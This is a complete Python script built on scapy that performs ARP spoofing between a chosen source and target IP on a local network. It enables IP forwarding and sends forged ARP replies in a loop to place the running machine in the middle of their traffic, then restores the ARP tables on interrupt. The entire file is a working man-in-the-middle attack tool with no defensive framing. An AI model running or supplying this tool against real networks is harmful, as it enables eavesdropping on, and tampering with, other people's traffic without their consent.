import optparse
import scapy.all as scapy
import subprocess
import time
 
 
def get_args():
    parser = optparse.OptionParser()
    parser.add_option('-s', '--source', dest='source', help='Enter IP Of Packet Source.')
    parser.add_option('-t', '--target', dest='target', help='Enter IP Of Packet Target.')
 
    option = parser.parse_args()[0]
 
    if not option.source:
        parser.error('Enter IP Of Packet Source To Proceed Further')
    elif not option.target:
        parser.error('Enter IP Of Packet Source To Proceed Further')
    else:
        return parser.parse_args()[0]
 
 
def get_mac(ip):
    arp_rq = scapy.ARP(pdst=ip)
    ether_rq = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
 
    packet = ether_rq/arp_rq
 
    ans = scapy.srp(packet, timeout=1, verbose=False)[0]
 
    for element in ans:
        return element[1].hwsrc
 
 
def spoof(ip_source, ip_target):
    print('[+] Enabling IP Forwarding....')
    subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
    target_mac = get_mac(ip_target)
    source_mac = get_mac(ip_source)
    if target_mac is None:
        print('Target Mac Not Found For IP: ' + ip_target)
    elif source_mac is None:
        print('Source Mac Not Found For IP: ' + ip_source)
    else:
        count = 2
        try:
            while True:
                    spoof_target = scapy.ARP(op=2, pdst=ip_target, hwdst=target_mac, psrc=ip_source)
                    spoof_source = scapy.ARP(op=2, pdst=ip_source, hwdst=source_mac, psrc=ip_target)
                    scapy.send(spoof_source, verbose=False)
                    scapy.send(spoof_target, verbose=False)
                    print('\rPacket Sent:', count, end='')
                    count = count + 2
                    time.sleep(2)
        except KeyboardInterrupt:
            print('\n[+] Please Wait Restoring ARP Table of Source and Target')
            restore_arp_table(ip_source, ip_target, target_mac, source_mac)
            print('[+] Please Wait... Disabling IP Forwarding')
            subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
 
 
def restore_arp_table(ip_source, ip_target, target_mac, source_mac):
    restore_target_table = scapy.ARP(op=2, pdst=ip_target, hwdst=target_mac, psrc=ip_source, hwsrc=source_mac)
    restore_source_table = scapy.ARP(op=2, pdst=ip_source, hwdst=source_mac, psrc=ip_target, hwsrc=target_mac)
 
    scapy.send(restore_target_table)
    scapy.send(restore_source_table)
 
 
option2 = get_args()
spoof(option2.source, option2.target)
